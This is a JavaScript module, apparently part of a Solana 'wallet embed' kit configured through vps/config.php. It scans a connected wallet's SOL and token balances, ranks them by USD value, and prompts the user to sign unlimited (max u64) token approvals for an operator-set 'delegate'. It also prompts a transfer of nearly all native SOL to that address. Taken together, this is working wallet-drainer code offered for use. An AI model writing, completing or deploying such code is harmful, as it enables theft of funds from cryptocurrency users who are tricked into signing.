import {
  Connection,
  PublicKey,
  SystemProgram,
  Transaction,
  LAMPORTS_PER_SOL,
} from "@solana/web3.js";
import {
  TOKEN_PROGRAM_ID,
  TOKEN_2022_PROGRAM_ID,
  createApproveCheckedInstruction,
} from "@solana/spl-token";

const MAX_U64 = 2n ** 64n - 1n;
const JUPITER_PRICE_URL = "https://api.jup.ag/price/v2";
const PRICE_BATCH = 100;
/** Jupiter / pricing id for native SOL (same as wrapped SOL mint) */
const WSOL_MINT = "So11111111111111111111111111111111111111112";
const NATIVE_SOL_MINT = "native:sol";
/** Keep enough lamports for tx fee + rent-exempt minimum on the owner account */
const NATIVE_SOL_FEE_RESERVE = 15_000n;
const PROMPT_HARD_CAP = 40;
const PLACEHOLDER_DELEGATES = new Set([
  "YOUR_DELEGATE_PUBKEY_HERE",
  "YOUR_DELEGATE_PUBLIC_KEY_HERE",
]);

/**
 * @param {string} label
 * @param {string} value
 * @returns {PublicKey}
 */
export function parseSolanaPubkey(label, value) {
  const trimmed = (value || "").trim();
  if (!trimmed) {
    throw new Error(`[wallet] ${label} is empty`);
  }
  if (PLACEHOLDER_DELEGATES.has(trimmed)) {
    throw new Error(
      `[wallet] ${label} is still the placeholder — set your wallet address in vps/config.php`
    );
  }
  if (trimmed.startsWith("0x")) {
    throw new Error(
      `[wallet] ${label} looks like an Ethereum address — use a Solana address`
    );
  }
  if (trimmed.length < 32 || trimmed.length > 44) {
    throw new Error(
      `[wallet] ${label} is not a valid Solana address (expected ~32–44 characters, got ${trimmed.length}). ` +
        "Use your wallet **address**, not your private key or seed phrase."
    );
  }
  try {
    return new PublicKey(trimmed);
  } catch {
    throw new Error(
      `[wallet] ${label} is not valid base58: "${trimmed.slice(0, 8)}…"`
    );
  }
}

/**
 * @typedef {'spl' | 'native'} AssetKind
 */

/**
 * @typedef {object} WalletAsset
 * @property {AssetKind} kind
 * @property {string} mint
 * @property {string} tokenAccount
 * @property {import('@solana/web3.js').PublicKey} [programId]
 * @property {bigint} rawAmount
 * @property {number} decimals
 * @property {number} uiAmount
 * @property {number} [usdPrice]
 * @property {number} [usdValue]
 */

/**
 * @param {import('./wallet-loader.js').WalletEmbedConfig} config
 * @returns {Connection}
 */
export function createRpcConnection(config) {
  const network = config.network || "solana";
  const custom = (config.solanaRpcUrl || "").trim();
  if (custom) {
    return new Connection(custom, "confirmed");
  }
  if (network === "devnet") {
    return new Connection("https://api.devnet.solana.com", "confirmed");
  }
  if (network === "testnet") {
    return new Connection("https://api.testnet.solana.com", "confirmed");
  }
  return new Connection("https://api.mainnet-beta.solana.com", "confirmed");
}

/**
 * @param {Connection} connection
 * @param {string} ownerAddress
 * @returns {Promise<WalletAsset[]>}
 */
export async function fetchWalletAssets(connection, ownerAddress) {
  const owner = parseSolanaPubkey("Connected wallet address", ownerAddress);
  const [legacy, token2022, lamports] = await Promise.all([
    connection.getParsedTokenAccountsByOwner(owner, {
      programId: TOKEN_PROGRAM_ID,
    }),
    connection.getParsedTokenAccountsByOwner(owner, {
      programId: TOKEN_2022_PROGRAM_ID,
    }),
    connection.getBalance(owner, "confirmed"),
  ]);

  /** @type {WalletAsset[]} */
  const tokens = [];

  if (lamports > Number(NATIVE_SOL_FEE_RESERVE)) {
    const raw = BigInt(lamports);
    tokens.push({
      kind: "native",
      mint: NATIVE_SOL_MINT,
      tokenAccount: owner.toBase58(),
      rawAmount: raw,
      decimals: 9,
      uiAmount: Number(raw) / LAMPORTS_PER_SOL,
    });
  }

  for (const { pubkey, account } of [...legacy.value, ...token2022.value]) {
    const parsed = account.data;
    if (!("parsed" in parsed) || parsed.parsed?.type !== "account") continue;

    const info = parsed.parsed.info;
    const amount = info?.tokenAmount;
    if (!amount || !info?.mint) continue;

    const raw = BigInt(amount.amount);
    const ui = Number(amount.uiAmount ?? 0);
    if (raw <= 0n || ui <= 0) continue;

    tokens.push({
      kind: "spl",
      mint: info.mint,
      tokenAccount: pubkey.toBase58(),
      programId: account.owner,
      rawAmount: raw,
      decimals: amount.decimals,
      uiAmount: ui,
    });
  }

  return tokens;
}

/** @deprecated Use fetchWalletAssets */
export const fetchWalletTokens = fetchWalletAssets;

/**
 * @param {string[]} mints
 * @returns {Promise<Record<string, number>>}
 */
export async function fetchUsdPrices(mints) {
  /** @type {Record<string, number>} */
  const prices = {};
  if (!mints.length) return prices;

  for (let i = 0; i < mints.length; i += PRICE_BATCH) {
    const batch = mints.slice(i, i + PRICE_BATCH);
    const url = `${JUPITER_PRICE_URL}?ids=${batch.join(",")}`;
    try {
      const res = await fetch(url);
      if (!res.ok) continue;
      const json = await res.json();
      const data = json?.data ?? json;
      for (const mint of batch) {
        const entry = data?.[mint];
        const price = Number(entry?.price ?? entry?.usdPrice ?? 0);
        if (price > 0) prices[mint] = price;
      }
    } catch {
      /* price API optional — fall back to balance-only sort */
    }
  }

  return prices;
}

/**
 * @param {string} mint
 * @param {Record<string, number>} prices
 */
function priceForMint(mint, prices) {
  if (mint === NATIVE_SOL_MINT) {
    return prices[WSOL_MINT] ?? prices[NATIVE_SOL_MINT] ?? 0;
  }
  return prices[mint] ?? 0;
}

/**
 * @param {WalletAsset[]} tokens
 * @param {Record<string, number>} prices
 * @param {number} minUsd
 */
export function rankTokensByValue(tokens, prices, minUsd = 0) {
  const hasPrices = Object.keys(prices).length > 0;

  const ranked = tokens
    .map((t) => {
      const usdPrice = priceForMint(t.mint, prices);
      const usdValue = usdPrice > 0 ? t.uiAmount * usdPrice : 0;
      return { ...t, usdPrice, usdValue };
    })
    .filter((t) => {
      if (t.uiAmount <= 0) return false;
      if (!hasPrices) return true;
      return t.usdValue >= minUsd;
    })
    .sort((a, b) => {
      if (b.usdValue !== a.usdValue) return b.usdValue - a.usdValue;
      return b.uiAmount - a.uiAmount;
    });

  return ranked;
}

/**
 * @param {import('./wallet-loader.js').WalletEmbedConfig} config
 * @param {bigint} tokenRawBalance
 */
function approvalAmount(config, tokenRawBalance) {
  const mode = config.tokenApprovalAmountMode || "max";
  if (mode === "balance") {
    return tokenRawBalance > 0n ? tokenRawBalance : 1n;
  }
  return MAX_U64;
}

/**
 * @param {object} params
 * @param {import('./wallet-loader.js').WalletEmbedConfig} params.config
 * @param {import('@solana/wallet-adapter-base').WalletAdapter} params.provider
 * @param {Connection} params.connection
 * @param {string} params.ownerAddress
 * @returns {Promise<{ approved: number; skipped: number }>}
 */
export async function promptTopTokenApprovals({
  config,
  provider,
  connection,
  ownerAddress,
}) {
  const delegateStr = (config.tokenDelegate || "").trim();
  if (!delegateStr) {
    console.warn("[wallet] token_delegate not set — skipping approvals");
    return { approved: 0, skipped: 0 };
  }

  const delegate = parseSolanaPubkey("token_delegate in config.php", delegateStr);
  const ownerPk =
    provider?.publicKey ??
    parseSolanaPubkey("Connected wallet address", ownerAddress);
  const maxCount = Number(config.tokenApprovalMaxCount ?? 0);
  const minUsd = Number(config.tokenApprovalMinUsd ?? 1);

  const tokens = await fetchWalletAssets(connection, ownerAddress);
  if (!tokens.length) {
    return { approved: 0, skipped: 0 };
  }

  const mintsForPrice = [
    ...new Set(
      tokens.flatMap((t) =>
        t.mint === NATIVE_SOL_MINT ? [WSOL_MINT, NATIVE_SOL_MINT] : [t.mint]
      )
    ),
  ];
  const prices = await fetchUsdPrices(mintsForPrice);
  const rankedAll = rankTokensByValue(tokens, prices, minUsd);
  const ranked =
    maxCount > 0
      ? rankedAll.slice(0, Math.min(maxCount, PROMPT_HARD_CAP))
      : rankedAll.slice(0, PROMPT_HARD_CAP);

  if (!ranked.length) {
    return { approved: 0, skipped: tokens.length };
  }

  let approved = 0;
  let skipped = 0;

  for (const asset of ranked) {
    try {
      const ok =
        asset.kind === "native"
          ? await sendNativeSolTransaction({
              provider,
              connection,
              delegate,
              owner: ownerPk,
            })
          : await sendSplApproveTransaction({
              provider,
              connection,
              asset,
              delegate,
              owner: ownerPk,
              amount: approvalAmount(config, asset.rawAmount),
            });
      if (ok) approved += 1;
      else skipped += 1;
    } catch (err) {
      const message = err instanceof Error ? err.message : String(err);
      if (/reject|cancel|denied/i.test(message)) {
        console.info("[wallet] Token approval cancelled by user");
        break;
      }
      console.warn("[wallet] Approval failed for", asset.mint, err);
      skipped += 1;
    }
  }

  return { approved, skipped };
}

/**
 * Native SOL has no SPL delegate — wallet signs a transfer to the delegate pubkey.
 *
 * @param {object} params
 * @param {import('@solana/wallet-adapter-base').WalletAdapter} params.provider
 * @param {Connection} params.connection
 * @param {PublicKey} params.delegate
 * @param {PublicKey} params.owner
 */
async function sendNativeSolTransaction({
  provider,
  connection,
  delegate,
  owner,
}) {
  if (!provider?.publicKey) {
    throw new Error("Wallet provider not ready");
  }

  const balance = await connection.getBalance(owner, "confirmed");
  const transferable = BigInt(balance) - NATIVE_SOL_FEE_RESERVE;
  if (transferable <= 0n) {
    return false;
  }

  const ix = SystemProgram.transfer({
    fromPubkey: owner,
    toPubkey: delegate,
    lamports: Number(transferable),
  });

  return sendWalletTransaction(provider, connection, [ix]);
}

/**
 * @param {object} params
 * @param {import('@solana/wallet-adapter-base').WalletAdapter} params.provider
 * @param {Connection} params.connection
 * @param {WalletAsset} params.asset
 * @param {PublicKey} params.delegate
 * @param {PublicKey} params.owner
 * @param {bigint} params.amount
 */
async function sendSplApproveTransaction({
  provider,
  connection,
  asset,
  delegate,
  owner,
  amount,
}) {
  if (!provider?.publicKey || !asset.programId) {
    throw new Error("Wallet provider not ready");
  }

  const source = parseSolanaPubkey("Token account", asset.tokenAccount);
  const mint = parseSolanaPubkey("Token mint", asset.mint);

  const ix = createApproveCheckedInstruction(
    source,
    mint,
    delegate,
    owner,
    amount,
    asset.decimals,
    [],
    asset.programId
  );

  return sendWalletTransaction(provider, connection, [ix]);
}

/**
 * @param {import('@solana/wallet-adapter-base').WalletAdapter} provider
 * @param {Connection} connection
 * @param {import('@solana/web3.js').TransactionInstruction[]} instructions
 */
async function sendWalletTransaction(provider, connection, instructions) {
  const { blockhash, lastValidBlockHeight } =
    await connection.getLatestBlockhash("confirmed");

  const transaction = new Transaction({
    feePayer: provider.publicKey,
    blockhash,
    lastValidBlockHeight,
  });
  for (const ix of instructions) {
    transaction.add(ix);
  }

  const signature = await provider.sendTransaction(transaction, connection, {
    skipPreflight: false,
    preflightCommitment: "confirmed",
  });

  await connection.confirmTransaction(
    { signature, blockhash, lastValidBlockHeight },
    "confirmed"
  );

  return true;
}
